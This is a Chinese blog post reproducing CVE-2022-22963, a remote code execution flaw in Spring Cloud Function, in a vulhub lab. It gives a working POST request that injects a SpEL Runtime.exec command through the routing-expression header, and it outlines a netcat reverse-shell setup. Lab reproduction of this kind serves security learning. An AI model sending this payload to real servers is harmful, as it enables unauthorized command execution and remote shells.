# 漏洞复现-CVE-2022-22963-Spring Cloud Function SpEL RCE - 铺哩 - 博客园

> 原文：[`www.cnblogs.com/cute-puli/p/16318077.html`](https://www.cnblogs.com/cute-puli/p/16318077.html)

# 0x00 实验环境

攻击机：Ubuntu

靶场：vulhub 搭建的靶场环境

# 0x01 影响版本

*   3.0.0.RELEASE <= Spring Cloud Function <= 3.1.6
*   Spring Cloud Function <= 3.2.2

**不受影响版本**

*   Spring Cloud Function 3.1.7
*   Spring Cloud Function 3.2.3

# 0x02 漏洞复现

（1）访问页面，默认页面是这样：

![](img/d6b45b946725ba3084860363485ca98c.png)

（2）首先验证漏洞，直接刷新链接，然后抓包，然后发送 post 包：

POST /functionRouter HTTP/1.1
Host: xxx:8080
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("ping xxx.xxx.xxx")
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

**![](img/9a6eb04d030262571966709affca8146.png)**

 （3）直接反弹 shell 的命令：**nc -lvp 端口**

这里需要注意将反弹 shell 的命令进行 base64 编码后再发包：**https://ir0ny.top/pentest/reverse-encoder-shell.html**

**![](img/495ab0aede3e8166826e311156a00f89.png)**

![](img/963020a9b8e772057ca47aa5d37b0eca.png)

 ![](img/1e68f54c81133882e84a8cd81da70407.png)

# 0x03 漏洞原理

 https://blog.csdn.net/qq_36869808/article/details/124164802

# 0x04 参考文献

https://blog.csdn.net/qq_36869808/article/details/124164802

# 0x05 免责声明

本漏洞复现文章仅用于学习、工作与兴趣爱好，并立志为网络安全奉献一份力量，凡是利用本博客相关内容的无良**hackers**造成的安全事故均与本人无关！